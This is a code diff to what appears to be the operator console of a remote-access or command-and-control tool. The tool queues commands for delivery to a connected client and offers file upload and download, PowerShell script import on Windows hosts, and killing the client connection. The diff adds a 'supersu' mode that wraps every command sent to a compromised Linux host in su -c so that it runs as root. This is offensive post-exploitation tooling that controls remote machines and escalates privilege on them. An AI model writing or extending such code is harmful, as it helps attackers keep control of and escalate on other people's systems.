@@ -20,6 +20,7 @@ from neotermcolor import colored
 responses = {}
 silent = False
 whoami_raw = None
+sudo_password = None
 lock = threading.Lock()
 upload_started = False
 upload_pending_chunks = []
@@ -573,6 +574,17 @@ def prompt_loop():
                         else:
                             command = f"sudo {command}"
 
+                    if command == "supersu":
+                        if ":" in pwd_cmd:
+                            print(colored("[!] Error: supersu is only available on Linux hosts\n", "red"))
+                            command = None
+                        else:
+                            print("\n")
+                            root = True
+                            old_user = REMOTE_INFO['whoami']
+                            REMOTE_INFO['whoami'] = "root"
+                            command = None
+
                     if "upload" in command.split()[0]:
                         args = oslex.split(command)
                         if len(args) != 3:
@@ -695,7 +707,7 @@ def prompt_loop():
                         print(colored("    upload: Upload a file from local to remote computer","blue"))
                         print(colored("    download: Download a file from remote to local computer","blue"))
                         print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
-                        print(colored("    sudo: Execute with sudo privileges on Linux hosts","blue"))                        
+                        print(colored("    supersu: Force all commands to be executed as root", "blue"))
                         print(colored("    clear/cls: Clear terminal screen","blue"))
                         print(colored("    kill: Kill client connection","blue"))
                         print(colored("    exit: Exit from program\n","blue"))
@@ -706,6 +718,9 @@ def prompt_loop():
                             print (colored("[!] Exiting..\n", "red"))
                             break
                             exit(0)
+
+                        if root and not sudo_password:
+                            command = f"su -c '{command}'"
 
                         with lock:
                             active_command = {'cmd': command, 'delivered': False}
